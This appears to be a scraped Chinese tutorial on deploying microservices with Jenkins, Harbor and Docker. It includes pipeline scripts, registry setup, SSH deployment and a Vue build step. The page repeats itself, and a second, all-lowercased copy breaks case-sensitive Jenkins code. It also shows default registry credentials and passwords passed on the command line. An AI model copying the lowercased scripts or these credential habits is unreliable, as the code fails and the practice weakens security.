stage(\'pull code\') {\n        checkout([$class: \'GitSCM\', branches: [[name: \'*/${branch}\']], extensions: [], userRemoteConfigs: [[credentialsId: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n    }\n    // 编译并推送镜像仓库\n    stage(\'build project\') {\n        if  ("${project_name}" ==  \'demo\' ) {\n            echo \'打包根目录\'\n            sh \'mvn clean package dockerfile:build\'\n        } else {\n            echo  "打包子目录 ${project_name}"\n            sh "mvn -f ${project_name} clean package dockerfile:build"\n        }\n        echo "把jar上传镜像仓库"\n        def oldImageName = "${project_name}:latest"\n        def newImageName = "${harbor_url}/${harbor_project}/${project_name}:${tag}"\n        // 改名称 做规范\n        sh "docker tag ${oldImageName} ${newImageName}"\n        // 删除之前的 镜像\n        sh "docker rmi ${oldImageName}"\n        // 推送到 dockers仓库\n        withCredentials([usernamePassword(credentialsId: \'8a3d7ab1-4cd6-482c-86c9-a12aa6404d98\', passwordVariable: \'harbor_password\', usernameVariable: \'harbor_account\')]) {\n            // 登录\n            sh "docker login -u ${harbor_account} -p ${harbor_password} ${harbor_url}"\n            // 上传\n            sh "docker push ${newImageName}"\n            echo "镜像推送成功"\n        }\n    }\n    // 发送邮件\n    stage(\'send email\') {\n        emailext body: \'\'\'<!DOCTYPE html>\n        <html>\n        <head>\n            <meta charset="UTF-8">\n            <title>${ENV, var="JOB_NAME"}-第${BUILD_NUMBER}次构建日志</title>\n        </head>\n        <body leftmargin="8" marginwidth="0" topmargin="8" marginheight="4" offset="0">\n        <table width="95%" cellpadding="0" cellspacing="0" style="font-size: 11pt; font-family: Tahoma, Arial, Helvetica, sansserif">\n            <tr>\n                <td>(本邮件是程序自动下发的，请勿回复！)</td>\n            </tr>\n            <tr>\n                <td><h2>\n                    <font color="#0000FF">构建结果 - ${BUILD_STATUS}</font>\n                </h2></td>\n            </tr>\n            <tr>\n                <td><br/>\n                    <b><font color="#0B610B">构建信息</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>项目名称&nbsp;：&nbsp;${PROJECT_NAME}</li>\n                        <li>构建编号&nbsp;：&nbsp;第${BUILD_NUMBER}次构建</li>\n                        <li>触发原因：&nbsp;${CAUSE}</li>\n                        <li>构建日志：&nbsp;\n                            <a href="${BUILD_URL}console">${BUILD_URL}console</a>\n                        </li>\n                        <li>构建&nbsp;&nbsp;Url&nbsp;：&nbsp;\n                            <a href="${BUILD_URL}">${BUILD_URL}</a>\n                        </li>\n                        <li>工作目录&nbsp;：&nbsp;\n                            <a href="${PROJECT_URL}ws">${PROJECT_URL}ws</a>\n                        </li>\n                        <li>项目&nbsp;&nbsp;Url&nbsp;：&nbsp;\n                            <a href="${PROJECT_URL}">${PROJECT_URL}</a>\n                        </li>\n                    </ul>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0B610B">Changes Since Last Successful Build:</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>历史变更记录 : <a href="${PROJECT_URL}changes">${PROJECT_URL}changes</a></li>\n                    </ul>\n                    ${CHANGES_SINCE_LAST_SUCCESS,reverse=true, format="Changes for Build #%n:<br/>%c<br/>",showPaths=true,changesFormat="<pre>[%a]<br/>%m</pre>",pathFormat="&nbsp;&nbsp;&nbsp;&nbsp;%p"}\n                </td>\n            </tr>\n            <tr>\n                <td><b>Failed Test Results</b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <pre style="font-size: 11pt; font-family: Tahoma, Arial, Helvetica,sans-serif">\n                        $FAILED_TESTS\n                    </pre>\n                    <br/>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0B610B">构建日志 (最后 100行):</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <textarea cols="80" rows="30" readonly="readonly"\n                              style="font-family: Courier New">\n                        ${BUILD_LOG,maxLines=100}\n                    </textarea>\n                </td>\n            </tr>\n        </table>\n        </body>\n        </html>\'\'\', mimeType: \'text/html\', subject: \'43243214321\', to: \'875730567@qq.com\'\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n\n\n\n# jenkins 自动化服务拉取镜像并启动\n\n这部操作需要安装一个 Publish Over SSH 插件，安装好后在 Manager Jenkins -> Configure System 进行配置\n\n\n\n更改 Jenkinsfile 脚本，添加远程机器拉取镜像并启动容器，具体语法怎么使用，可以到 流水线语法中查看\n\n\n\nnode {\n    // 版本\n    def tag = "1.0"\n    // 镜像仓库的地址\n    def harbor_url = "192.168.81.102:85"\n    // 镜像仓库的项目,这里建议项目名称和jenkins的item项目名称、以及harbor的项目名称保持一致，否则用一下脚本会出问题\n    def harbor_project = "demo"\n\n    // 拉取代码\n    stage(\'pull code\') {\n        checkout([$class: \'GitSCM\', branches: [[name: \'*/${branch}\']], extensions: [], userRemoteConfigs: [[credentialsId: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n    }\n    // 编译并推送镜像仓库\n    stage(\'build project\') {\n        if  ("${project_name}" ==  \'demo\' ) {\n            echo \'打包根目录\'\n            sh \'mvn clean package dockerfile:build\'\n        } else {\n            echo  "打包子目录 ${project_name}"\n            sh "mvn -f ${project_name} clean package dockerfile:build"\n        }\n        echo "把jar上传镜像仓库"\n        def oldImageName = "${project_name}:latest"\n        def newImageName = "${harbor_url}/${harbor_project}/${project_name}:${tag}"\n        // 改名称 做规范\n        sh "docker tag ${oldImageName} ${newImageName}"\n        // 删除之前的 镜像\n        sh "docker rmi ${oldImageName}"\n        // 推送到 dockers仓库\n        withCredentials([usernamePassword(credentialsId: \'8a3d7ab1-4cd6-482c-86c9-a12aa6404d98\', passwordVariable: \'harbor_password\', usernameVariable: \'harbor_account\')]) {\n            // 登录\n            sh "docker login -u ${harbor_account} -p ${harbor_password} ${harbor_url}"\n            // 上传\n            sh "docker push ${newImageName}"\n            echo "镜像推送成功"\n        }\n\n        // 远程调用脚本,port 最好也添加 jenkins项目配置里的参数配置，作为参数传进来\n        echo "执行远程命令 /home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}"\n        sshPublisher(publishers: [sshPublisherDesc(configName: \'test_103\', transfers: [sshTransfer(cleanRemote: false, excludes: \'\', execCommand: "/home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}", execTimeout: 120000, flatten: false, makeEmptyDirs: false, noDefaultExcludes: false, patternSeparator: \'[, ]+\', remoteDirectory: \'\', remoteDirectorySDF: false, removePrefix: \'\', sourceFiles: \'\')], usePromotionTimestamp: false, useWorkspaceInPromotion: false, verbose: false)])\n\n    }\n    // 发送邮件\n    stage(\'send email\') {\n        emailext body: \'\'\'<!DOCTYPE html>\n        <html>\n        <head>\n            <meta charset="UTF-8">\n            <title>${ENV, var="JOB_NAME"}-第${BUILD_NUMBER}次构建日志</title>\n        </head>\n        <body leftmargin="8" marginwidth="0" topmargin="8" marginheight="4" offset="0">\n        <table width="95%" cellpadding="0" cellspacing="0" style="font-size: 11pt; font-family: Tahoma, Arial, Helvetica, sansserif">\n            <tr>\n                <td>(本邮件是程序自动下发的，请勿回复！)</td>\n            </tr>\n            <tr>\n                <td><h2>\n                    <font color="#0000FF">构建结果 - ${BUILD_STATUS}</font>\n                </h2></td>\n            </tr>\n            <tr>\n                <td><br/>\n                    <b><font color="#0B610B">构建信息</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>项目名称&nbsp;：&nbsp;${PROJECT_NAME}</li>\n                        <li>构建编号&nbsp;：&nbsp;第${BUILD_NUMBER}次构建</li>\n                        <li>触发原因：&nbsp;${CAUSE}</li>\n                        <li>构建日志：&nbsp;\n                            <a href="${BUILD_URL}console">${BUILD_URL}console</a>\n                        </li>\n                        <li>构建&nbsp;&nbsp;Url&nbsp;：&nbsp;\n                            <a href="${BUILD_URL}">${BUILD_URL}</a>\n                        </li>\n                        <li>工作目录&nbsp;：&nbsp;\n                            <a href="${PROJECT_URL}ws">${PROJECT_URL}ws</a>\n                        </li>\n                        <li>项目&nbsp;&nbsp;Url&nbsp;：&nbsp;\n                            <a href="${PROJECT_URL}">${PROJECT_URL}</a>\n                        </li>\n                    </ul>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0B610B">Changes Since Last Successful Build:</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>历史变更记录 : <a href="${PROJECT_URL}changes">${PROJECT_URL}changes</a></li>\n                    </ul>\n                    ${CHANGES_SINCE_LAST_SUCCESS,reverse=true, format="Changes for Build #%n:<br/>%c<br/>",showPaths=true,changesFormat="<pre>[%a]<br/>%m</pre>",pathFormat="&nbsp;&nbsp;&nbsp;&nbsp;%p"}\n                </td>\n            </tr>\n            <tr>\n                <td><b>Failed Test Results</b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <pre style="font-size: 11pt; font-family: Tahoma, Arial, Helvetica,sans-serif">\n                        $FAILED_TESTS\n                    </pre>\n                    <br/>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0B610B">构建日志 (最后 100行):</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <textarea cols="80" rows="30" readonly="readonly"\n                              style="font-family: Courier New">\n                        ${BUILD_LOG,maxLines=100}\n                    </textarea>\n                </td>\n            </tr>\n        </table>\n        </body>\n        </html>\'\'\', mimeType: \'text/html\', subject: \'43243214321\', to: \'875730567@qq.com\'\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n\n\n重新构建，其他服务器就会自动拉取了。\n\n> 其他服务器一定要有 jenkins 服务器的公钥，构建过程 SSH 不会输出任何信息只会告诉你 EXEC 执行了多久，需要自己去测一下。\n\n\n# vue 前端使用 Jenkins 部署\n\n1. 首先需要安装 NodeJS 插件\n2. 到 Manager Jenkins->Global Tool Configuration->NodeJS\n\n\n\n3. 创建一个流水线的前端项目，根据脚本把配置补全\n\nnode {\n    stage(\'拉取代码\') {\n        checkout([$class: \'GitSCM\', branches: [[name: \'*/${branch}\']], extensions: [], userRemoteConfigs: [[credentialsId: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test_vue.git\']]])\n    }\n    stage(\'打包，部署网站\') {\n        //使用NodeJS的npm进行打包，这个和 以上的 name 保持一致\n        nodejs(\'nodejs12\'){\n            sh \'\'\'\n                npm install\n                npm run build\n            \'\'\'\n        }\n        //=====以下为远程调用进行项目部署========\n        sshPublisher(publishers: [sshPublisherDesc(configName: \'master_server\',transfers: [sshTransfer(cleanRemote: false, excludes: \'\', execCommand: \'\',execTimeout: 120000, flatten: false, makeEmptyDirs: false, noDefaultExcludes:false, patternSeparator: \'[, ]+\', remoteDirectory: \'/usr/share/nginx/html\',remoteDirectorySDF: false, removePrefix: \'dist\', sourceFiles: \'dist/**\')],usePromotionTimestamp: false, useWorkspaceInPromotion: false, verbose: false)])\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n从脚本中可以看出，我们需要一个 branch 参数，还要配置 前端项目的 远程 server 地址\n\n> 这里没有使用 execCommand 的命令，而是通过 sourceFiles、removePrefix、remoteDirectory，sourceFiles 代表我们 copy 哪个文件，remoteDirectory 远程目录，特就是 copy 到 nginx 所在目录\n> 57-62',normalizedContent:'大致流程说明：\n1. 开发人员每天把代码提交到 gitlab 代码仓库\n2.jenkins 从 gitlab 中拉取项目源码，编译并打成 jar 包，然后构建成 docker 镜像，将镜像上传到 harbor 私有仓库。\n3.jenkins 发送 ssh 远程命令，让生产部署服务器到 harbor 私有仓库拉取镜像到本地，然后创建容器。\n4. 最后，用户可以访问到容器\n\n> 这里不讲述 docker 的安装及基础命令的使用，学 dockers 可以看 docker 概念、命令、dockerfile 等看这篇就够了 这篇文章\n\n\n# harbor 镜像仓库安装及使用\n\nharbor（港口，港湾）是一个用于存储和分发 docker 镜像的企业级 registry 服务器。除了 harbor 这个私有镜像仓库之外，还有 docker 官方提供的 registry。相对 registry，harbor 具有很多优势：\n\n 1. 提供分层传输机制，优化网络传输 docker 镜像是是分层的，而如果每次传输都使用全量文件 (所以\n    用 ftp 的方式并不适合)，显然不经济。必须提供识别分层传输的机制，以层的 uuid 为标识，确定\n    传输的对象。\n 2. 提供 web 界面，优化用户体验 只用镜像的名字来进行上传下载显然很不方便，需要有一个用户界\n    面可以支持登陆、搜索功能，包括区分公有、私有镜像。\n 3. 支持水平扩展集群 当有用户对镜像的上传下载操作集中在某服务器，需要对相应的访问压力作分\n    解。\n 4. 良好的安全机制 企业中的开发团队有很多不同的职位，对于不同的职位人员，分配不同的权限，\n    具有更好的安全性。\n\n\n# harbor 安装\n\n 1. 除了 docker 以外，还要安装 dockers-compose，docker compose 命令及使用 你可以看这篇博客\n 2. 下载 harbor 的压缩包，地址，需要科式上网，下载完成开始解压\n\ntar -xzf harbor-offline-installer-v1.9.2.tgz\nmv harbor /opt/software/\n# 修改配置文件内容\nvim /opt/software/harbor/harbor.yml \n# 修改hostname\nhostname: 你自己机器的ip\n# 修改端口\nport: 85\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 3. 安装 harbor\n\ncd /opt/software/harbor\n./prepare\n./install.sh\n\n\n1\n2\n3\n\n 4. 启动 harbor\n\ndocker-compose up -d 启动\ndocker-compose stop 停止\ndocker-compose restart 重新启动\n\n\n1\n2\n3\n\n 5. 访问 harbor http://ip:85，默认账户密码：admin/harbor12345\n\n\n# harbor 使用\n\n1. 创建项目\nharbor 的项目分为公开和私有的：\n\n * 公开项目：所有用户都可以访问，通常存放公共的镜像，默认有一个 library 公开项目。\n * 私有项目：只有授权用户才可以访问，通常存放项目本身的镜像。\n\n我们可以为微服务项目创建一个新的项目：\n\n\n\n\n\n2. 用户创建\n\n\n\n3. 为用户分配项目\n\n\n\n\n\n\n# 推送到镜像仓库\n\n# 打标签，命令 docker tag nginx:1.17.1 harbor的ip:端口/harbor项目的名称/镜像名字\ndocker tag nginx:1.17.1 192.168.81.102:85/test/nginx:1.17.1\n# 查看\ndocker images\n# 会多一条镜像数据\n192.168.81.102:85/test/nginx         1.17.1                          98ebf73aba75        2 years ago         109mb\n\n\n1\n2\n3\n4\n5\n6\n\n\n把 harbor 地址加入到 docker 信任列表\n\n# 编辑docker文件\nvim /etc/docker/daemon.json\n# 加入这句话\n"insecure-registries":["192.168.81.102:85"],\n# 重启配置和docker\nsystemctl restart docker\n# harbor  的 test 项目是私有的，需要登录\ndocker login -u admin -p harbor12345 192.168.81.102:85\n# 推送到harbor仓库里\ndocker push 192.168.81.102:85/test/nginx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n\n\n\n其他服务下载镜像也需要把地址添加到 docker 的配置文件中，并且也需要使用 docker login 进行登录。复制以下的命令，到其他服务器下执行即可。\n\n\n\n\n# 微服务构建到 docker 镜像\n\n1. 把微服务提交到 svn\n2. 在 jenkins 上创建一个 pipelin 类型的 item（项目）\n3. 配置 pipelin item 的构建时参数\n\n\n\n\n\n\n\n> 这里讲一点，项目中很多的 jar 是有依赖关系的，如果单独打某个服务可能会包找不到依赖，所以建议第一次对根目录进行打包，会把依赖全部加载到 maven 库中，后期单个服务打包即可。\n\n4. 在每个服务的 pom 文件中添加 plugin\n\n\x3c!-- 帮助读取项目中的dockerfile文件，帮我们构建docker镜像 --\x3e\n<plugin>\n    <groupid>com.spotify</groupid>\n    <artifactid>dockerfile-maven-plugin</artifactid>\n    <version>1.3.6</version>\n    <configuration>\n        <repository>${project.artifactid}</repository>\n        \x3c!-- 定义dockerfile 文件的参数 --\x3e\n        <buildargs>\n            \x3c!-- 定义一个 java_file 参数,指为我们项目的名称 --\x3e\n            <jar_file>target/${project.build.finalname}.jar</jar_file>\n        </buildargs>\n    </configuration>\n</plugin>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n5. 在每个服务的根目录下编写 dockerfile 文件\n\nfrom openjdk:8-jdk-alpine\n# 这个会读取在pom中声明的变量\narg jar_file\ncopy ${jar_file} app.jar\n# 对外端口\nexpose 10086\nentrypoint ["java","-jar","/app.jar"]\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n6. 设置构建后镜像推至镜像仓库\n\n\n\n\n\n\n\n7. 在项目的根目录中编写 jenkinsfile\n\nnode {\n    // 版本\n    def tag = "1.0"\n    // 镜像仓库的地址\n    def harbor_url = "192.168.81.102:85"\n    // 镜像仓库的项目,这里建议项目名称和jenkins的item项目名称、以及harbor的项目名称保持一致，否则用一下脚本会出问题\n    def harbor_project = "demo"\n\n    // 拉取代码\n    stage(\'pull code\') {\n        checkout([$class: \'gitscm\', branches: [[name: \'*/${branch}\']], extensions: [], userremoteconfigs: [[credentialsid: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n    }\n    // 编译并推送镜像仓库\n    stage(\'build project\') {\n        if  ("${project_name}" ==  \'demo\' ) {\n            echo \'打包根目录\'\n            sh \'mvn clean package dockerfile:build\'\n        } else {\n            echo  "打包子目录 ${project_name}"\n            sh "mvn -f ${project_name} clean package dockerfile:build"\n        }\n        echo "把jar上传镜像仓库"\n        def oldimagename = "${project_name}:latest"\n        def newimagename = "${harbor_url}/${harbor_project}/${project_name}:${tag}"\n        // 改名称 做规范\n        sh "docker tag ${oldimagename} ${newimagename}"\n        // 删除之前的 镜像\n        sh "docker rmi ${oldimagename}"\n        // 推送到 dockers仓库\n        withcredentials([usernamepassword(credentialsid: \'8a3d7ab1-4cd6-482c-86c9-a12aa6404d98\', passwordvariable: \'harbor_password\', usernamevariable: \'harbor_account\')]) {\n            // 登录\n            sh "docker login -u ${harbor_account} -p ${harbor_password} ${harbor_url}"\n            // 上传\n            sh "docker push ${newimagename}"\n            echo "镜像推送成功"\n        }\n    }\n    // 发送邮件\n    stage(\'send email\') {\n        emailext body: \'\'\'<!doctype html>\n        <html>\n        <head>\n            <meta charset="utf-8">\n            <title>${env, var="job_name"}-第${build_number}次构建日志</title>\n        </head>\n        <body leftmargin="8" marginwidth="0" topmargin="8" marginheight="4" offset="0">\n        <table width="95%" cellpadding="0" cellspacing="0" style="font-size: 11pt; font-family: tahoma, arial, helvetica, sansserif">\n            <tr>\n                <td>(本邮件是程序自动下发的，请勿回复！)</td>\n            </tr>\n            <tr>\n                <td><h2>\n                    <font color="#0000ff">构建结果 - ${build_status}</font>\n                </h2></td>\n            </tr>\n            <tr>\n                <td><br/>\n                    <b><font color="#0b610b">构建信息</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>项目名称&nbsp;：&nbsp;${project_name}</li>\n                        <li>构建编号&nbsp;：&nbsp;第${build_number}次构建</li>\n                        <li>触发原因：&nbsp;${cause}</li>\n                        <li>构建日志：&nbsp;\n                            <a href="${build_url}console">${build_url}console</a>\n                        </li>\n                        <li>构建&nbsp;&nbsp;url&nbsp;：&nbsp;\n                            <a href="${build_url}">${build_url}</a>\n                        </li>\n                        <li>工作目录&nbsp;：&nbsp;\n                            <a href="${project_url}ws">${project_url}ws</a>\n                        </li>\n                        <li>项目&nbsp;&nbsp;url&nbsp;：&nbsp;\n                            <a href="${project_url}">${project_url}</a>\n                        </li>\n                    </ul>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0b610b">changes since last successful build:</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>历史变更记录 : <a href="${project_url}changes">${project_url}changes</a></li>\n                    </ul>\n                    ${changes_since_last_success,reverse=true, format="changes for build #%n:<br/>%c<br/>",showpaths=true,changesformat="<pre>[%a]<br/>%m</pre>",pathformat="&nbsp;&nbsp;&nbsp;&nbsp;%p"}\n                </td>\n            </tr>\n            <tr>\n                <td><b>failed test results</b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <pre style="font-size: 11pt; font-family: tahoma, arial, helvetica,sans-serif">\n                        $failed_tests\n                    </pre>\n                    <br/>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0b610b">构建日志 (最后 100行):</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <textarea cols="80" rows="30" readonly="readonly"\n                              style="font-family: courier new">\n                        ${build_log,maxlines=100}\n                    </textarea>\n                </td>\n            </tr>\n        </table>\n        </body>\n        </html>\'\'\', mimetype: \'text/html\', subject: \'43243214321\', to: \'875730567@qq.com\'\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n\n\n\n# jenkins 自动化服务拉取镜像并启动\n\n这部操作需要安装一个 publish over ssh 插件，安装好后在 manager jenkins -> configure system 进行配置\n\n\n\n更改 jenkinsfile 脚本，添加远程机器拉取镜像并启动容器，具体语法怎么使用，可以到 流水线语法中查看\n\n\n\nnode {\n    // 版本\n    def tag = "1.0"\n    // 镜像仓库的地址\n    def harbor_url = "192.168.81.102:85"\n    // 镜像仓库的项目,这里建议项目名称和jenkins的item项目名称、以及harbor的项目名称保持一致，否则用一下脚本会出问题\n    def harbor_project = "demo"\n\n    // 拉取代码\n    stage(\'pull code\') {\n        checkout([$class: \'gitscm\', branches: [[name: \'*/${branch}\']], extensions: [], userremoteconfigs: [[credentialsid: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n    }\n    // 编译并推送镜像仓库\n    stage(\'build project\') {\n        if  ("${project_name}" ==  \'demo\' ) {\n            echo \'打包根目录\'\n            sh \'mvn clean package dockerfile:build\'\n        } else {\n            echo  "打包子目录 ${project_name}"\n            sh "mvn -f ${project_name} clean package dockerfile:build"\n        }\n        echo "把jar上传镜像仓库"\n        def oldimagename = "${project_name}:latest"\n        def newimagename = "${harbor_url}/${harbor_project}/${project_name}:${tag}"\n        // 改名称 做规范\n        sh "docker tag ${oldimagename} ${newimagename}"\n        // 删除之前的 镜像\n        sh "docker rmi ${oldimagename}"\n        // 推送到 dockers仓库\n        withcredentials([usernamepassword(credentialsid: \'8a3d7ab1-4cd6-482c-86c9-a12aa6404d98\', passwordvariable: \'harbor_password\', usernamevariable: \'harbor_account\')]) {\n            // 登录\n            sh "docker login -u ${harbor_account} -p ${harbor_password} ${harbor_url}"\n            // 上传\n            sh "docker push ${newimagename}"\n            echo "镜像推送成功"\n        }\n\n        // 远程调用脚本,port 最好也添加 jenkins项目配置里的参数配置，作为参数传进来\n        echo "执行远程命令 /home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}"\n        sshpublisher(publishers: [sshpublisherdesc(configname: \'test_103\', transfers: [sshtransfer(cleanremote: false, excludes: \'\', execcommand: "/home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}", exectimeout: 120000, flatten: false, makeemptydirs: false, nodefaultexcludes: false, patternseparator: \'[, ]+\', remotedirectory: \'\', remotedirectorysdf: false, removeprefix: \'\', sourcefiles: \'\')], usepromotiontimestamp: false, useworkspaceinpromotion: false, verbose: false)])\n\n    }\n    // 发送邮件\n    stage(\'send email\') {\n        emailext body: \'\'\'<!doctype html>\n        <html>\n        <head>\n            <meta charset="utf-8">\n            <title>${env, var="job_name"}-第${build_number}次构建日志</title>\n        </head>\n        <body leftmargin="8" marginwidth="0" topmargin="8" marginheight="4" offset="0">\n        <table width="95%" cellpadding="0" cellspacing="0" style="font-size: 11pt; font-family: tahoma, arial, helvetica, sansserif">\n            <tr>\n                <td>(本邮件是程序自动下发的，请勿回复！)</td>\n            </tr>\n            <tr>\n                <td><h2>\n                    <font color="#0000ff">构建结果 - ${build_status}</font>\n                </h2></td>\n            </tr>\n            <tr>\n                <td><br/>\n                    <b><font color="#0b610b">构建信息</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>项目名称&nbsp;：&nbsp;${project_name}</li>\n                        <li>构建编号&nbsp;：&nbsp;第${build_number}次构建</li>\n                        <li>触发原因：&nbsp;${cause}</li>\n                        <li>构建日志：&nbsp;\n                            <a href="${build_url}console">${build_url}console</a>\n                        </li>\n                        <li>构建&nbsp;&nbsp;url&nbsp;：&nbsp;\n                            <a href="${build_url}">${build_url}</a>\n                        </li>\n                        <li>工作目录&nbsp;：&nbsp;\n                            <a href="${project_url}ws">${project_url}ws</a>\n                        </li>\n                        <li>项目&nbsp;&nbsp;url&nbsp;：&nbsp;\n                            <a href="${project_url}">${project_url}</a>\n                        </li>\n                    </ul>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0b610b">changes since last successful build:</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>历史变更记录 : <a href="${project_url}changes">${project_url}changes</a></li>\n                    </ul>\n                    ${changes_since_last_success,reverse=true, format="changes for build #%n:<br/>%c<br/>",showpaths=true,changesformat="<pre>[%a]<br/>%m</pre>",pathformat="&nbsp;&nbsp;&nbsp;&nbsp;%p"}\n                </td>\n            </tr>\n            <tr>\n                <td><b>failed test results</b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <pre style="font-size: 11pt; font-family: tahoma, arial, helvetica,sans-serif">\n                        $failed_tests\n                    </pre>\n                    <br/>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0b610b">构建日志 (最后 100行):</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <textarea cols="80" rows="30" readonly="readonly"\n                              style="font-family: courier new">\n                        ${build_log,maxlines=100}\n                    </textarea>\n                </td>\n            </tr>\n        </table>\n        </body>\n        </html>\'\'\', mimetype: \'text/html\', subject: \'43243214321\', to: \'875730567@qq.com\'\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n\n\n重新构建，其他服务器就会自动拉取了。\n\n> 其他服务器一定要有 jenkins 服务器的公钥，构建过程 ssh 不会输出任何信息只会告诉你 exec 执行了多久，需要自己去测一下。\n\n\n# vue 前端使用 jenkins 部署\n\n1. 首先需要安装 nodejs 插件\n2. 到 manager jenkins->global tool 